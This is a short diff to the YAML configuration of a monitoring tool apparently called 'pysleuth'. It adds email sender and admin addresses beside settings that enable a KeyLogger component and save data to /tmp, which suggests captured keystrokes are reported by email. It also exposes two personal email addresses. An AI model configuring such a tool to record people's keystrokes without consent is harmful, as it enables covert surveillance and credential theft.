@@ -3,6 +3,12 @@ General:
   monitor-every: 3
   save-data-to: /tmp/pysleuth
 
+Email:
+  program-email: "pynotifs.ashwin@gmail.com"
+  admin-email: "na19b001@smail.iitm.ac.in"
+
+Telegram: null
+
 Components:
   KeyLogger:
     enable: true
